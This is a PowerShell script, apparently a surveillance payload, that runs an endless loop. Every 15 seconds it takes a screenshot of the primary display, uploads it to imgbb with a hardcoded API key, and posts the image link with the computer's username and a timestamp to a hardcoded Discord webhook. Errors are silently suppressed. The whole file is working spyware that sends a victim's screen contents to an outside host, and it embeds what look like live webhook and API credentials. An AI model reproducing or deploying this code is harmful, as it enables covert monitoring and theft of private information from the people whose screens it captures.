# dodododo
function Capture-Screenshot {
    param (
        [string]$OutputFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

    $bmp.Save($OutputFilePath)
    $graphics.Dispose()
    $bmp.Dispose()
}

function Upload-ToImgbb {
    param (
        [string]$ImageFilePath,
        [string]$ApiKey
    )

    $url = "https://api.imgbb.com/1/upload?key=$ApiKey"

    $formData = @{
        "image" = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($ImageFilePath))
    }

    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $formData
        if ($response.success) {
            return $response.data.url
        } else {
            return $null
        }
    } catch {
        return $null
    }
}

# Function to send the Discord message with an image URL
function Send-DiscordMessage {
    param (
        [string]$WebhookUrl,
        [string]$UserName,
        [string]$ImageUrl
    )

    $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Message = "$UserName at $DateTime $ImageUrl"

    $payload = @{
        content = $Message
        embeds = @(
            @{
                image = @{
                    url = $ImageUrl
                }
            }
        )
    }

    $body = $payload | ConvertTo-Json -Depth 5  

    $headers = @{
        'Content-Type' = 'application/json'
    }

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
    } catch {
    }
}


$discordWebhookUrl = "https://discord.com/api/webhooks/1287792562098274315/OpWPJFFOR_DP-FzhglSz6EThsVESr0fHA3LJRtSn-zxRsykRXLfcb-phlqx4zAi8ttYn"

$imgbbApiKey = "21a6327cc8f24b597872c67643973fca"

while ($true) {
    $outputFilePath = "$env:temp\$env:computername-Capture.png"
    Capture-Screenshot -OutputFilePath $outputFilePath

    $imageUrl = Upload-ToImgbb -ImageFilePath $outputFilePath -ApiKey $imgbbApiKey

    if ($imageUrl) {
        Send-DiscordMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
    } else {
    }

    Start-Sleep -Seconds 15
}
